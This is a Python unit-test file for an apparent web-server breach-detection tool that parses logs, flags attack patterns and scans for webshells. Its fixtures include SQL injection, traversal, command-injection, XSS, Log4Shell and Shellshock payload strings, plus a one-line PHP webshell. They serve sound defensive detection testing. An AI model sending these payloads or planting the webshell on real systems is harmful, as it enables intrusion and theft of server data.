"""LogSight 웹서버 침해 판단 모듈 테스트. 실행: python -m unittest discover -s tests -v"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from logsight.web import weblog, webdetect, webscan, webanalyze  # noqa: E402
from logsight.web.webprofile import SiteProfile  # noqa: E402
from logsight.web.webpipeline import assess  # noqa: E402

A = ('198.51.100.9 - - [10/Oct/2026:13:55:36 +0000] "GET /search.php?q={q} HTTP/1.1" '
     '{st} {by} "-" "{ua}"')


def acc(q="x", st=200, by=100, ua="curl/8"):
    return A.format(q=q, st=st, by=by, ua=ua)


class AccessParserTests(unittest.TestCase):
    def test_combined_fields(self):
        evs = weblog.parse_access(acc(q="hello", st=200, by=512, ua="Mozilla"), "access.log")
        self.assertEqual(len(evs), 1)
        e = evs[0]
        self.assertEqual(e.src_ip, "198.51.100.9")
        self.assertEqual(e.extra["method"], "GET")
        self.assertEqual(e.extra["path"], "/search.php")
        self.assertEqual(e.extra["query"], "q=hello")
        self.assertEqual(e.outcome, "success")
        self.assertEqual(e.raw_ref, "access.log:1")

    def test_status_outcomes(self):
        self.assertEqual(weblog.parse_access(acc(st=404))[0].outcome, "client-error")
        self.assertEqual(weblog.parse_access(acc(st=500))[0].outcome, "server-error")

    def test_xff_multi_ip_takes_client(self):
        line = ('203.0.113.5, 10.0.0.1 - - [10/Oct/2026:13:55:36 +0000] '
                '"GET / HTTP/1.1" 200 1 "-" "x"')
        self.assertEqual(weblog.parse_access(line)[0].src_ip, "203.0.113.5")

    def test_bad_lines_skipped(self):
        self.assertEqual(weblog.parse_access("쓰레기\n\n#comment"), [])


class ErrorAuthParserTests(unittest.TestCase):
    def test_nginx_error_with_client(self):
        line = ('2026/10/10 13:55:36 [error] 12#0: *5 open() "/x" failed (2: No such file), '
                'client: 198.51.100.9, server: _')
        e = weblog.parse_weberror(line)[0]
        self.assertEqual(e.src_ip, "198.51.100.9")
        self.assertEqual(e.source, "weberror")

    def test_apache_error_with_client(self):
        line = "[Sat Oct 10 13:55:36.123456 2026] [php:error] [pid 7] [client 198.51.100.9:5] boom"
        e = weblog.parse_weberror(line)[0]
        self.assertEqual(e.src_ip, "198.51.100.9")

    def test_auth_ssh_sudo_useradd(self):
        text = ("Oct 10 13:55:36 web sshd[1]: Failed password for root from 198.51.100.9 port 22 ssh2\n"
                "Oct 10 13:55:40 web sshd[1]: Accepted password for root from 198.51.100.9 port 22 ssh2\n"
                "Oct 10 13:56:00 web sudo:   root : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/id\n"
                "Oct 10 13:56:10 web useradd[9]: new user: name=svc, UID=1001\n")
        evs = weblog.parse_auth(text, year=2026)
        kinds = [(e.action, e.outcome) for e in evs]
        self.assertIn(("ssh_login", "failure"), kinds)
        self.assertIn(("ssh_login", "success"), kinds)
        self.assertIn(("sudo", "success"), kinds)
        self.assertIn(("useradd", "success"), kinds)


class DetectTests(unittest.TestCase):
    def _run(self, lines, profile=None):
        text = "\n".join(lines)
        evs = weblog.parse_access(text, "a.log")
        return {f.rule for f in webdetect.run_web_detections(evs, profile)}

    def test_sqli_traversal_cmd_xss(self):
        rules = self._run([
            acc(q="' UNION SELECT a,b FROM users-- -"),
            acc(q="../../../../etc/passwd"),
            acc(q="host=127.0.0.1;id"),
            acc(q="<script>alert(1)</script>"),
        ])
        self.assertLessEqual({"WEBLOG_SQLI", "WEBLOG_TRAVERSAL", "WEBLOG_CMD_INJECTION",
                              "WEBLOG_XSS"}, rules)

    def test_webshell_access_ignores_404_probe(self):
        # 404 로 끝난 webshell 이름 요청(스캔)은 세지 않는다
        line404 = acc(q="").replace("/search.php?q=", "/c99.php?x=1").replace(" 200 ", " 404 ")
        self.assertNotIn("WEBLOG_WEBSHELL_ACCESS", self._run([line404]))
        line200 = acc().replace("/search.php?q=x", "/uploads/c99.php?cmd=id")
        self.assertIn("WEBLOG_WEBSHELL_ACCESS", self._run([line200]))

    def test_enum_404_burst(self):
        lines = [acc(q="").replace("/search.php?q=", f"/missing{i}").replace(" 200 ", " 404 ")
                 for i in range(20)]
        self.assertIn("WEBLOG_ENUM_404", self._run(lines))

    def test_scanner_ua(self):
        self.assertIn("WEBLOG_SCANNER", self._run([acc(ua="sqlmap/1.8")]))

    def test_trusted_ip_suppresses_scanner(self):
        p = SiteProfile(trusted_ips=["198.51.100.0/24"])
        self.assertNotIn("WEBLOG_SCANNER", self._run([acc(ua="nikto/2")], p))

    def test_brute_then_success(self):
        base = '198.51.100.9 - - [10/Oct/2026:13:{mm}:00 +0000] "POST /login.php HTTP/1.1" {st} 1 "-" "x"'
        lines = [base.format(mm=f"{10+i:02d}", st=401) for i in range(10)]
        lines.append(base.format(mm="25", st=302))
        p = SiteProfile(login_paths=["/login.php"])
        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access("\n".join(lines)), p)}
        self.assertIn("WEBLOG_AUTH_BRUTE", rules)
        self.assertIn("WEBLOG_AUTH_SUCCESS_AFTER_FAIL", rules)


class ScanTests(unittest.TestCase):
    def test_webshell_found_benign_ignored(self):
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "uploads").mkdir()
            # 진짜 웹셸 신호
            (root / "uploads" / "x.php").write_text("<?php system($_GET['cmd']);", encoding="utf-8")
            # 정상 앱 코드($_GET 사용하지만 웹셸 아님) → 걸리면 안 됨
            (root / "page.php").write_text("<?php echo htmlspecialchars($_GET['q']);", encoding="utf-8")
            prof = SiteProfile(webroot=str(root), upload_dirs=["/uploads"])
            findings, evs = webscan.scan_webroot(prof)
            rules = {f.rule for f in findings}
            paths = {f.key for f in findings}
            self.assertIn("FILE_WEBSHELL", rules)
            self.assertIn("/uploads/x.php", paths)
            self.assertNotIn("/page.php", paths)  # 정상 파일은 오탐 없음


class AnalyzeTests(unittest.TestCase):
    def test_rule_verdict(self):
        self.assertEqual(webanalyze.rule_verdict([{"rule": "FILE_WEBSHELL"}])[0], "breached")
        self.assertEqual(webanalyze.rule_verdict([{"rule": "WEBLOG_AUTH_SUCCESS_AFTER_FAIL"}])[0],
                         "likely_breached")
        self.assertEqual(webanalyze.rule_verdict([{"rule": "WEBLOG_SQLI"}])[0], "suspicious")
        self.assertEqual(webanalyze.rule_verdict([])[0], "no_evidence")

    def test_validate_filters_hallucinated_refs(self):
        incident = {"events": [{"ref": "a.log:1"}], "findings": []}
        report = {"attack_flow": [{"evidence": ["a.log:1", "made_up:9"]}],
                  "root_causes": [], "remediation": []}
        v = webanalyze.validate(report, incident)
        self.assertEqual(report["attack_flow"][0]["evidence"], ["a.log:1"])
        self.assertEqual(report["attack_flow"][0]["unverified_evidence"], ["made_up:9"])
        self.assertFalse(v["passed"])


class PipelineTests(unittest.TestCase):
    def _profile(self, d: Path) -> SiteProfile:
        logs = d / "logs"
        logs.mkdir()
        acc_lines = [acc(q="' UNION SELECT a,b FROM users-- -")]
        (logs / "access.log").write_text("\n".join(acc_lines), encoding="utf-8")
        return SiteProfile(name="t", log_paths={"access": [str(logs / "access.log")]})

    def test_assess_end_to_end_rules(self):
        with tempfile.TemporaryDirectory() as d:
            res = assess(self._profile(Path(d)), use_ai=False)
            self.assertEqual(res["overall_verdict"], "suspicious")
            self.assertGreaterEqual(res["n_findings"], 1)
            self.assertTrue(res["results"][0]["meta"]["validation"]["passed"])

    def test_assess_ai_path_mocked(self):
        fake = {"verdict": "breached", "summary": "s", "severity": "high", "confidence": "high",
                "attack_flow": [{"stage": "initial-access", "technique": "T1190", "time": "t",
                                 "what": "w", "evidence": []}],
                "root_causes": [], "remediation": [], "unknowns": []}
        with tempfile.TemporaryDirectory() as d, \
                mock.patch.dict(os.environ, {"ANTHROPIC_API_KEY": "x"}), \
                mock.patch("logsight.web.webanalyze._call_claude", return_value=(fake, {"input_tokens": 1, "output_tokens": 1})):
            res = assess(self._profile(Path(d)), use_ai=True)
            self.assertEqual(res["results"][0]["meta"]["mode"], "claude")
            self.assertEqual(res["results"][0]["report"]["verdict"], "breached")


class NewRuleTests(unittest.TestCase):
    def test_sqli_false_positive_plain_words(self):
        # 따옴표·주석 없이 select…from 이 나오는 정상 검색어는 SQL 인젝션이 아니다
        from logsight.web.webdetect import is_sqli
        self.assertFalse(is_sqli("select color from menu"))
        self.assertFalse(is_sqli("keyboard and mouse"))
        self.assertFalse(is_sqli("1 or 2 people headset"))

    def test_sqli_true_positives(self):
        from logsight.web.webdetect import is_sqli
        self.assertTrue(is_sqli("' UNION SELECT a,b FROM users-- -"))
        self.assertTrue(is_sqli("' OR 1=1 -- "))
        self.assertTrue(is_sqli("x' and select name from users--"))

    def test_code_in_user_agent_is_log_poisoning(self):
        line = acc(ua="<?php system($_GET['c']); ?>")
        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(line))}
        self.assertIn("WEBLOG_CODE_IN_HEADER", rules)

    def test_include_of_access_log_is_traversal(self):
        line = acc(q="f=/var/www/logs/access.log&c=id")
        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(line))}
        self.assertIn("WEBLOG_TRAVERSAL", rules)

    def test_admin_redirect_to_login_is_not_access(self):
        base = ('198.51.100.9 - - [10/Oct/2026:13:55:36 +0000] "GET /admin/members.php HTTP/1.1" '
                '302 0 "-" "Mozilla/5.0"')
        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(base), SiteProfile())}
        self.assertNotIn("WEBLOG_ADMIN_ACCESS", rules)

    def test_default_admin_login_then_export_is_access_and_exfil(self):
        lines = ('198.51.100.9 - - [10/Oct/2026:13:55:36 +0000] "POST /admin/login.php HTTP/1.1" 302 0 "-" "x"\n'
                 '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /admin/members.php HTTP/1.1" 200 120000 "-" "x"')
        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
        self.assertIn("WEBLOG_ADMIN_ACCESS", rules)
        self.assertIn("WEBLOG_LARGE_EXFIL", rules)

    def test_phtml_upload_is_exec(self):
        line = acc(q="").replace("/search.php?q=", "/uploads/shell.phtml?cmd=")
        p = SiteProfile(upload_dirs=["/uploads"])
        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(line), p)}
        self.assertIn("WEBLOG_UPLOAD_EXEC", rules)


class ExternalChainTests(unittest.TestCase):
    def _rules(self, line, profile=None):
        return {f.rule for f in webdetect.run_web_detections(weblog.parse_access(line), profile or SiteProfile())}

    def test_ssrf_internal_address(self):
        line = acc(q="").replace("/search.php?q=", "/fetch.php?url=http://127.0.0.1:8081/internal/stats.php")
        self.assertIn("WEBLOG_SSRF", self._rules(line))

    def test_ssrf_public_address_not_flagged(self):
        line = acc(q="").replace("/search.php?q=", "/fetch.php?url=https://example.com/a.jpg")
        self.assertNotIn("WEBLOG_SSRF", self._rules(line))

    def test_open_redirect_query(self):
        line = acc(q="").replace("/search.php?q=", "/login.php?next=http://evil.example/verify")
        self.assertIn("WEBLOG_OPEN_REDIRECT", self._rules(line))

    def test_backup_and_git_exposure_need_success(self):
        ok = acc(q="").replace("/search.php?q=", "/backup.sql")
        miss = acc(q="").replace("/search.php?q=", "/backup.sql").replace(" 200 ", " 404 ")
        git = acc(q="").replace("/search.php?q=", "/.git/config")
        self.assertIn("WEBLOG_BACKUP_LEAK", self._rules(ok))
        self.assertNotIn("WEBLOG_BACKUP_LEAK", self._rules(miss))
        self.assertIn("WEBLOG_BACKUP_LEAK", self._rules(git))

    def test_directory_listing_of_uploads(self):
        line = acc(q="").replace("/search.php?q=", "/uploads/")
        p = SiteProfile(upload_dirs=["/uploads"])
        self.assertIn("WEBLOG_DIR_LISTING", self._rules(line, p))

    def test_csrf_foreign_referer_on_admin_post(self):
        base = ('198.51.100.9 - - [10/Oct/2026:13:55:36 +0000] "POST /admin/delete_product.php HTTP/1.1" '
                '302 0 "{ref}" "Mozilla/5.0"')
        self.assertIn("WEBLOG_CSRF_SUSPECT", self._rules(base.format(ref="http://evil.example/p.html")))
        self.assertNotIn("WEBLOG_CSRF_SUSPECT", self._rules(base.format(ref="http://127.0.0.1:8081/admin/members.php")))

    def test_forged_admin_cookie_without_login(self):
        line = ('198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /admin/members.php HTTP/1.1" 200 120000 "-" "x"')
        self.assertIn("WEBLOG_ADMIN_FORGED", self._rules(line, SiteProfile()))

    def test_idor_sequential_orders(self):
        lines = "\n".join(
            f'198.51.100.9 - - [10/Oct/2026:13:55:{i:02d} +0000] "GET /order.php?id={i} HTTP/1.1" 200 300 "-" "x"'
            for i in range(1, 13))
        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
        self.assertIn("WEBLOG_IDOR_ENUM", rules)

    def test_probe_strings_in_user_agent(self):
        self.assertIn("WEBLOG_EXPLOIT_PROBE", self._rules(acc(ua="${jndi:ldap://198.51.100.99/a}")))
        self.assertIn("WEBLOG_EXPLOIT_PROBE", self._rules(acc(ua="() { :; }; /bin/cat /etc/passwd")))


if __name__ == "__main__":
    unittest.main()
